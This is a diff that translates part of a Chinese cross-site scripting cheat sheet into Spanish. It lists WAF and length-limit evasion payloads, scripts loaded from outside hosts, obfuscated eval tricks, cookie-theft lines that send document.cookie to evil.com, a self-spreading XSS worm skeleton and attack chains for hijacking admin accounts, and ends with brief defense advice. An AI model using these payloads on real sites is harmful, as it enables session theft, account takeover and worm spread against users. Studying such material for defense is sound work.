@@ -113,33 +113,33 @@ xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
 <body onload=alert(1)>
 ```
 
-#### WAF特定绕过
+#### Evasión específica de WAF
 
 ```html
-.<script src=http://localhost/1.js>.    <!-- 安全宝：前后加点号 -->
-<!--[if true]><img onerror=alert(1) src=--> <!-- 注释干扰 -->
+.<script src=http://localhost/1.js>.    <!-- Anquanbao: agregar puntos antes y después -->
+<!--[if true]><img onerror=alert(1) src=--> <!-- Interferencia con comentarios -->
 ```
 
-#### 长度限制绕过
+#### Evasión de límites de longitud
 
 ```html
-<script src=//xss.pw/j>                <!-- 最短外部加载 -->
-<!-- DOM拼接 -->
+<script src=//xss.pw/j>                <!-- Carga externa más corta posible -->
+<!-- Concatenación DOM -->
 <script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
-<!-- 字符串拼接绕过关键字 -->
+<!-- Concatenación de cadenas para evadir palabras clave -->
 <script>window['al'+'ert'](1)</script>
 <!-- fromCharCode -->
 <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
 ```
 
-#### HTTPOnly绕过
+#### Evasión de HTTPOnly
 
-- Flash接口获取用户信息替代Cookie
-- 转为CSRF方式：直接执行敏感操作（改密码、加管理员、读token）
+- Uso de una interfaz Flash para obtener información del usuario en lugar de la Cookie
+- Conversión a CSRF: ejecutar directamente operaciones sensibles (cambiar contraseña, agregar administrador, leer token)
 
-### 2.5 利用链
+### 2.5 Cadena de explotación
 
-#### Cookie窃取
+#### Robo de Cookie
 
 ```html
 <script>new Image().src="https://evil.com/c?="+document.cookie</script>
@@ -147,41 +147,41 @@ xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
 <script>fetch('https://evil.com/c?='+document.cookie)</script>
 ```
 
-#### DOM XSS关键源与汇
+#### Fuentes y sumideros clave de XSS en DOM
 
-**危险源**：`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`
+**Fuentes peligrosas**: `location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`
 
-**危险汇**：`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`
+**Sumideros peligrosos**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`
 
-#### XSS蠕虫核心逻辑
+#### Lógica central del gusano XSS
 
 ```javascript
-// 1.获取当前用户身份(cookie/token)
-// 2.构造包含自身payload的内容
-// 3.自动发布/分享（AJAX POST）
-// 4.触发条件：查看/访问即传播
+// 1. Obtener la identidad del usuario actual (cookie/token)
+// 2. Construir contenido que incluya el propio payload
+// 3. Publicar/compartir automáticamente (AJAX POST)
+// 4. Condición de activación: se propaga con solo verlo/visitarlo
 function worm(){
-    jQuery.post("/api/post", {"content": "<自传播payload>"})
+    jQuery.post("/api/post", {"content": "<payload autopropagable>"})
 }
 worm()
 ```
 
-#### 组合利用模式
+#### Patrones de explotación combinada
 
 ```
-XSS + CSRF -> 获取Token执行管理操作
-XSS + SQLi -> 盲打获取Cookie -> 后台注入
-XSS -> 账号劫持 -> 权限提升 -> 蠕虫传播
-XSS盲打(留言/工单/反馈) -> 获取后台管理员Cookie
+XSS + CSRF -> Obtener Token para ejecutar operaciones administrativas
+XSS + SQLi -> Ataque a ciegas para obtener Cookie -> Inyección en el backend
+XSS -> Secuestro de cuenta -> Escalamiento de privilegios -> Propagación tipo gusano
+XSS a ciegas (mensajes/tickets/comentarios) -> Obtener la Cookie del administrador del backend
 ```
 
-### 2.6 防御措施
+### 2.6 Medidas de defensa
 
-- **输出编码**（核心）：HTML上下文用HTML实体，JS上下文用JS编码，URL上下文用URL编码
-- CSP策略限制脚本来源
-- HTTPOnly保护Cookie
-- 白名单输入验证（避免黑名单，总有遗漏）
-- **常见失误**：只过滤script标签、只过滤小写、前端过滤可抓包绕过、单次过滤被双写绕过
+- **Codificación de salida** (núcleo): entidades HTML en contexto HTML, codificación JS en contexto JS, codificación URL en contexto URL
+- Política CSP para restringir el origen de los scripts
+- HTTPOnly para proteger la Cookie
+- Validación de entrada por lista blanca (evitar listas negras, siempre quedan huecos)
+- **Errores comunes**: filtrar solo la etiqueta script, filtrar solo minúsculas, filtrado en frontend evadible capturando el tráfico, filtrado de una sola pasada evadido por doble escritura
 
 ---
 
